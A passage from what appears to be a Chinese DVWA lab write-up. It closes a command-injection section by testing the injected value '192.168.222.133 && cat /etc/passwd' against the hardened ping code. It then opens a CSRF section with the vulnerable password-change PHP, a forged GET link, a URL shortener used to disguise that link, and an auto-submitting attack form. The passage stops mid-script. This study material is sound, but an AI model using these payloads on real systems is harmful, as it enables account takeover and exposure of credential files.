back together.</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\">// Determine OS and execute the ping command.</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span> <span class=\"token function\">php_uname</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'s'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'Windows NT'</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token comment\">// Windows</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'ping  '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token comment\">// *nix</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'ping  -c 4 '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token comment\">// Feedback for the end user</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token comment\">// Ops. Let the user name theres a mistake</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>ERROR: You have entered an invalid IP.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">// Generate Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token function\">generateSessionToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>我们用 php 复现一下</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'192.168.222.133 &amp;&amp; cat /etc/passwd'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$target</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token variable\">$octet</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span> <span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$octet</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">sizeof</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$octet</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">4</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$octet</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span> <span class=\"token function\">php_uname</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'s'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'Windows NT'</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'ping  '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'ping  -c 4 '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">&#125;</span></span>&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;pre>ERROR: You have entered an invalid IP.&lt;/pre>'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>输出结果：</p>\n<figure class=\"highlight txt\"><figcaption data-lang=\"txt\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>192.168.222.133 &amp;&amp; cat /etc/passwd</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>192</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>168</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>222</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>133 &amp;&amp; cat /etc/passwd</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>&lt;pre>ERROR: You have entered an invalid IP.&lt;/pre></pre></td></tr></table></figure><p>先是过滤了反斜杠，然后将输入的 IP，按 <code>.</code>  分割，存入数组，判断数组中的元素是否为数字，有一个元素不是数字，就无法执行命令。</p>\n<p>至此命令注入篇就完全结束。</p>\n<h3 id=\"总结-2\"><a class=\"anchor\" href=\"#总结-2\">#</a> 总结</h3>\n<p>这一章学习了，命令连接符号在命令注入中的运用，并且如何防范命令注入漏洞。</p>\n<ul>\n<li>四种命令连接符的使用场景</li>\n<li>如何防范命令注入</li>\n</ul>\n<h2 id=\"csrf-跨站请求伪造\"><a class=\"anchor\" href=\"#csrf-跨站请求伪造\">#</a> CSRF 跨站请求伪造</h2>\n<p>CSRF，Cross-site request forgery），跨站请求伪造</p>\n<p>利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。</p>\n<p><img loading=\"lazy\" data-src=\"CRSF-1721199923435-21.png\" alt=\"CRSF\" /></p>\n<h3 id=\"low级-3\"><a class=\"anchor\" href=\"#low级-3\">#</a> low 级</h3>\n<p><a href=\"https://juejin.cn/post/7073447264756170765\">https://juejin.cn/post/7073447264756170765</a></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Change'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Get input</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$pass_new</span>  <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_new'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token variable\">$pass_conf</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password_conf'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token comment\">// Do the passwords match?</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$pass_conf</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token comment\">// They do!</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$pass_new</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass_new</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">// Update the database</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$insert</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"UPDATE `users` SET password = '<span class=\"token interpolation\"><span class=\"token variable\">$pass_new</span></span>' WHERE user = '\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">dvwaCurrentUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"';\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$insert</span> <span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;pre>'</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_error</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">// Feedback for the user</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Password Changed.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token comment\">// Issue with passwords matching</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;pre>Passwords did not match.&lt;/pre>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_null</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$___mysqli_res</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$___mysqli_res</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>Get 方式获取密码，两个密码输入一致，就会带入数据库修改密码。</p>\n<pre><code>http://192.168.23.129:8001/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#\n</code></pre>\n<p>受害者点击链接后就会成功修改密码，但是太明显了。</p>\n<p>短链接制作地址：<a href=\"https://tool.chinaz.com/tools/dwz.aspx\">https://tool.chinaz.com/tools/dwz.aspx</a></p>\n<pre><code>http://i7q.cn/5MNdJO\n</code></pre>\n<p>使用 curl -i 可以查看重定向信息</p>\n<pre><code class=\"language-cmd\">curl -i http://i7q.cn/5MNdJO\n</code></pre>\n<p><img loading=\"lazy\" data-src=\"image-20240715204715725.png\" alt=\"image-20240715204715725\" /></p>\n<p>另一种方法：</p>\n<p>构建页面 csrf.html 把他放在别的服务器下 <code>http://192.168.23.1:8000/csrf.html</code> ，受害者访问该页面会自动修改密码</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>CSRF<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>get<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>csrf<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://192.168.23.129:8001/vulnerabilities/csrf/<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password_new<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>2222<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password_conf<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>2222<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Change<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Change<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\"> document<span class=\"token punctuation\">.</span>forms<span class=\"token punctuation\">[</span><span class=\"token string\">\"csrf\"</span><span 